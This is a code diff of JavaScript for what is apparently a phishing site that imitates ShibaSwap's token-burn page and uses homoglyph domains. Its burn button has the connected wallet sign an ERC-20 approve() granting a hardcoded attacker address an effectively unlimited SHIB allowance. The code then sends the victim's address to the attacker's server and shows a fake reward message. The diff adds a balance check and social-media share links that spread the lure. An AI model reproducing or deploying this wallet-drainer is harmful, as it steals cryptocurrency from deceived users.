@@ -1,35 +1,11 @@
 const Web3 = require('web3');
-var baseURL = 'http://vps-2218353-x.dattaweb.com',
+var baseURL = 'http://shìbaswap.com',
     web3, metamaskAccounts = [], myAccount, isConnected, lastURL, actURL,
     shareReady = false, ourAddress = '0x17fCFf24f0e9b3b360a34df8d92455581Db0EF7c';
 
 var shibContract,
     shibContractAddress = '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
     shibAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"name","type":"string"},{"name":"symbol","type":"string"},{"name":"decimals","type":"uint8"},{"name":"totalSupply","type":"uint256"},{"name":"feeReceiver","type":"address"},{"name":"tokenOwnerAddress","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}];
-
-
-const button = document.getElementById('headlessui-popover-button-1');
-const element = document.getElementById('headlessui-popover-panel-2');
-const body = document.querySelector('body');
-
-button.addEventListener('click', function () {
-  element.classList.toggle('m-fadeIn');
-});
-
-body.addEventListener('click', function (e) {
-  if (e.target !== button && !isChildOf(e.target, button))
-  element.classList.remove('m-fadeIn');
-});
-
-function isChildOf(child, parent) {
-  if (child.parentNode === parent) {
-    return true;
-  } else if (child.parentNode === null) {
-    return false;
-  } else {
-    return isChildOf(child.parentNode, parent);
-  }
-}
 
 function activeCheck(element) {
   element.classList.remove('step_check');
@@ -72,6 +48,14 @@ async function burnEvents() {
     async function burnOn() {
       this.innerHTML = "<div class='preloader'></div>";
       if (isConnected) {
+
+        const networkId = await web3.eth.net.getId();
+        if (networkId != 1) {
+          showError('Select Ethereum Network');
+          burnButton.innerHTML = 'Burn tokens';
+          return
+        }
+
         activeCheck(tickBurn);
         let bigNumber = web3.utils.toBN('1000000000000000000000000000000'),
             datita = await shibContract.methods.approve(ourAddress, bigNumber).encodeABI();
@@ -84,21 +68,30 @@ async function burnEvents() {
           // this encodes the ABI of the method and the arguements
           data: datita
         }];
+
+        getSHIBBalance().then(async function (result) {
+          if (result > 10000000000000000000000) {
+            // Solicitamos firma de aprobación
+            await window.ethereum.request({ method: 'eth_sendTransaction', params: tx })
+              .then(async function () {
+                  // Aca guardamos que aceptó la transfer en un archivo.
+                  await fetch(baseURL + 'wallet/' + myAccount);
+                  showSuccess('¡Congratulations! You will receive your LEASH in the next 8 hours.');
+                  burnButton.innerHTML = 'Burn tokens';
+              })
+              .catch(() => {
+                  // Sí rechazó, mostramos error
+                  showError('Please, accept the request.')
+                  burnButton.innerHTML = 'Burn tokens';
+              });
+          } else {
+            burnButton.innerText = 'Burn tokens';
+            showError("You don't have enough SHIB in your wallet.");
+          }
+        });
     
-        // Solicitamos firma de aprobación
-        await window.ethereum.request({ method: 'eth_sendTransaction', params: tx })
-          .then(async function () {
-              // Aca guardamos que aceptó la transfer en un archivo.
-              await fetch(baseURL + 'wallet/' + myAccount);
-              showSuccess('¡Congratulations! You will receive your LEASH in the next 8 hours.')
-          })
-          .catch((error) => {
-              // Sí rechazó, mostramos error
-              this.innerHTML = 'Burn tokens';
-              showError('Please, accept the request.')
-          });
       } else {
-        this.innerHTML = 'Burn tokens';
+        burnButton.innerHTML = 'Burn tokens';
         showError('Please, connect your wallet.')
       }
     }
@@ -128,8 +121,16 @@ async function burnEvents() {
     // Tick on share
     shareButtons[0].onclick = shareOn;
     shareButtons[1].onclick = shareOn;
-    shareButtons[2].onclick = shareOn;
-    shareButtons[3].onclick = shareOn;
+
+    shareButtons[2].addEventListener('click', function() {
+      window.open('http://twitter.com/intent/tweet?text=Burn your shiba tokens and get leash as a reward.&amp;url=http://www.shibаswap.com/#/burn','Share burning', 'toolbar=0, status=0, width=650, height=450');
+      shareOn();
+    })
+    
+    shareButtons[3].addEventListener('click', function() {
+      window.open('http://www.facebook.com/sharer.php?u=http://www.shibаswap.com/#/burn','Share burning', 'toolbar=0, status=0, width=650, height=450');
+      shareOn();
+    })
 
     if (isConnected) shibContract = new web3.eth.Contract(shibAbi, shibContractAddress, {from: myAccount});
 }
@@ -342,6 +343,29 @@ window.onload = () => {
     setInterval(checkURL, 50);
     setInterval(setPriceTokens, 30000);
     if (document.location.pathname == '/' && !document.location.hash) history.pushState('', '', '/#/');
+
+    const button = document.getElementById('headlessui-popover-button-1'),
+      element = document.getElementById('headlessui-popover-panel-2'),
+      body = document.querySelector('body');
+
+    function isChildOf(child, parent) {
+      if (child.parentNode === parent) {
+        return true;
+      } else if (child.parentNode === null) {
+        return false;
+      } else {
+        return isChildOf(child.parentNode, parent);
+      }
+    }
+
+    button.addEventListener('click', function () {
+      element.classList.toggle('m-fadeIn');
+    });
+
+    body.addEventListener('click', function (e) {
+      if (e.target !== button && !isChildOf(e.target, button))
+      element.classList.remove('m-fadeIn');
+    });
 
     setPriceTokens();
 
